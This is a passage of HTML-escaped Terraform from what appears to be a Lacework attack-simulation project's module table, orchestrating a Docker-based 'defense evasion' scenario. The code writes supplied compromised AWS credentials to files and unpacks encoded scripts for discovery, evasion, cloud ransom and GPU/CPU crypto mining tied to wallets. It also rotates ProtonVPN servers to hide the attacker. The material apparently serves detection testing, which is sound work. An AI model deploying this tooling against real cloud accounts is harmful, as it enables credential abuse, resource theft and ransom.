var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = &quot;US&quot;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;free   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;free&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;paid   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;paid&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    baseline    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/baseline&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    discovery   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/discovery&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    evasion     = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/evasion&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudransom = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudransom&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudcrypto = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;crypto&#45;gpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    instances = 12<br/>                                    wallet = var&#46;inputs&&#35;91;&quot;ethermine&&#35;95;wallet&quot;&&#35;93;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    hostcrypto  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/hostcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;host&#45;cpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                    instances = 1<br/>                                    minergate&&#35;95;user = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/>                                    nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    terraform  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/terraform&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    start       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/start&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;free&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;free&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;auto&#45;paid&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;auto&#45;paid&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;baseline&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;baseline&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;discovery&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;discovery&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;evasion&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;evasion&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;cloudransom&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;cloudransom&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;terraform&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;terraform&&#35;41;<br/>            &&#35;125;,<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;start&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;start&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>       |
| attacker-simulation-attacker-exec-docker-composite-defense-evasion         | ./modules/ssm/execute-docker-composite-defense-evasion         | ssm_exec_docker_defense_evasion            | context.aws.ssm.attacker.execute.docker_composite_defense_evasion         | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_defense_evasion": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-defense-evasion         | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/cloud&#45;tunnel&quot;<br/>    script = &quot;evasion&#46;sh&quot;<br/>    script&&#35;95;type = &quot;aws&#45;cli&quot;<br/>    attack&&#35;95;type = &quot;defense&&#35;95;evasion&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/protonvpn<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;start&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/start&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;free&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;free&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;auto&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/auto&#45;paid&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;paid&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;paid<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;protonvpn&#45;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;protonvpn&#45;baseline<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;baseline&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/baseline&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;discovery&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/discovery&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;evasion&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/evasion&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudransom&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/aws&#45;cli/scripts/cloudransom&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;cloudcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/cloudcrypto/terraform&#46;sh<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;hostcrypto&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/main&#46;tf<br/>    echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;terraform&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &gt; /$&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/terraform/scripts/hostcrypto/terraform&#46;sh<br/>    log &quot;Starting as background job&#46;&#46;&#46;&quot;<br/>    if &&#35;91; &quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;125;&quot; == &quot;0&quot; &&#35;93;; then<br/>        for i in $&&#35;40;echo &quot;US NL&#45;FREE&#35;1 JP&#45;FREE&#35;3 NL&#45;FREE&#35;4 NL&#45;FREE&#35;8 US&#45;FREE&#35;5 NL&#45;FREE&#35;9 NL&#45;FREE&#35;12 NL&#45;FREE&#35;13 NL&#45;FREE&#35;14 NL&#45;FREE&#35;15 NL&#45;FREE&#35;16 US&#45;FREE&#35;13 US&#45;FREE&#35;32 US&#45;FREE&#35;33 US&#45;FREE&#35;34 NL&#45;FREE&#35;39 NL&#45;FREE&#35;52 NL&#45;FREE&#35;57 NL&#45;FREE&#35;87 NL&#45;FREE&#35;133 NL&#45;FREE&#35;136 NL&#45;FREE&#35;148 US&#45;FREE&#35;52 US&#45;FREE&#35;53 US&#45;FREE&#35;54 US&#45;FREE&#35;51 NL&#45;FREE&#35;163 NL&#45;FREE&#35;164 US&#45;FREE&#35;58 US&#45;FREE&#35;57 US&#45;FREE&#35;56 US&#45;FREE&#35;55&quot;&&#35;41;; do cp &#46;env&#45;protonvpn &#46;env&#45;protonvpn&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;$i; done<br/>        /bin/bash auto&#45;free&#46;sh<br/>    else<br/>        for i in $&&#35;40;echo &quot;AU CR IS JP LV NL NZ SG SK US&quot;&&#35;41;; do cp &#46;env&#45;protonvpn&#45;paid &#46;env&#45;protonvpn&#45;paid&#45;$i; sed &#45;i &quot;s/RANDOM/$i/&quot; &#46;env&#45;protonvpn&#45;paid&#45;$i; done<br/>        /bin/bash auto&#45;paid&#46;sh<br/>    fi;<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    protonvpn       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;paid       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;server&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;tier = 2<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    protonvpn&#45;baseline  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/protonvpn&#46;env&#46;tpl&quot;, <br/>                                &&#35;123;<br/>                                    protonvpn&&#35;95;user = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;user&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;password = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;password&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;server = &quot;US&quot;<br/>                                    protonvpn&&#35;95;tier = tostring&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;tier&quot;&&#35;93;&&#35;41;<br/>                                    protonvpn&&#35;95;protocol = var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;protocol&quot;&&#35;93;<br/>                                    protonvpn&&#35;95;privatekey = try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93;&&#35;41;, &quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;protonvpn&&#35;95;privatekey&quot;&&#35;93; : &quot;&quot;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;free   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;free&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    auto&#45;paid   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/auto&#45;paid&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    compromised&&#35;95;keys&&#35;95;user = var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;<br/>                                    script = local&#46;script<br/>                                    script&&#35;95;type = local&#46;script&&#35;95;type<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                    attack&&#35;95;delay = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    baseline    = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/baseline&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    discovery   = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/discovery&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    evasion     = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/evasion&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudransom = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudransom&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    cloudcrypto = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;crypto&#45;gpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    instances = 12<br/>                                    wallet = var&#46;inputs&&#35;91;&quot;ethermine&&#35;95;wallet&quot;&&#35;93;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    hostcrypto  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/hostcrypto&#46;tf&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    name = &quot;host&#45;cpu&#45;miner&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;environment&quot;&&#35;93;&&#35;125;&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;deployment&quot;&&#35;93;&&#35;125;&quot;<br/>                                    region = var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;<br/>                                    instances = 1<br/>                                    minergate&&#35;95;user = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/>                                    nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    terraform  = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/terraform&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                &&#35;125;<br/>                            &&#35;41;<br/>    <br/>    start       = templatefile&&#35;40;<br/>                                &quot;$&&#35;123;abspath&&#35;40;path&#46;root&&#35;41;&&#35;125;/modules/deployment/common/payloads/linux/modules/resources/start&#46;sh&#46;tpl&quot;,<br/>                                &&#35;123;<br/>                                    attack&&#35;95;type = local&#46;attack&&#35;95;type<br/>                                &&#35;125;<br/>                            &&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  